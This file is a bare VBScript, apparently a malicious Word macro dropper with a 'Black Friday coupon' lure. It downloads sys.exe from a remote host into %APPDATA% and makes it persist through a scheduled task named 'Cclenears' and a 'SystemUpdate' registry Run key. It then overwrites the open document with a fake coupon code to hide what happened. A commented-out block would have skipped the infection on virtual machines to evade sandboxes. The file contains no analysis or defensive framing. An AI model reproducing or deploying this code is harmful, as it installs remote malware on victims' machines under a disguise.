Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}!\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
Set ZZuuuZEV = CreateObject( "WScript.Shell" )
Set objWord = GetObject(,"Word.Application")
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
Set objShell = CreateObject( "WScript.Shell" )
appDataLocation=objShell.ExpandEnvironmentStrings("%APPDATA%")

' For Each objItem in colItems
  ' strModel = objItem.Model
    ' If InStr(UCase(strModel), "VIRTUAL") Then
	' objWord.Visible = True
	' Set objDoc = objWord.Documents.Open(objWord.ActiveDocument.FullName)
	' objDoc.Select
	' Set objSelection = objWord.Selection
	' objSelection.Delete
	' objSelection.Text = "Your Black Friday coupon code:BLACKFRIDAY-2017-787418189432721061370" 
	' objSelection.EndOf
	' objDoc.SaveAs(objWord.ActiveDocument.FullName)
	' objDoc.Close(wdSaveChanges)
	' WScript.Quit
    ' End If
' Next

ZZuuuZEV.Run "schtasks /create /tn Cclenears /SC HOURLY /MO 3 /tr ""%appdata%\sys.exe""", 0
root = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
KeyHP = "SystemUpdate"
ZZuuuZEV.RegWrite root+keyHP,"%appdata%\sys.exe"

URL = "https://forum.cryptopia.gdn/sys.exe"
FILENAME = appDataLocation & "\sys.exe"
http_obj.open "GET", URL, False
http_obj.send
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2




objWord.Visible = True
Set objDoc = objWord.Documents.Open(objWord.ActiveDocument.FullName)
objDoc.Select
Set objSelection = objWord.Selection
objSelection.Delete
objSelection.Text = "Your Black Friday coupon code:BLACKFRIDAY-2017-787418189432721061370" 
objSelection.EndOf
objDoc.SaveAs(objWord.ActiveDocument.FullName)
objDoc.Close(wdSaveChanges)
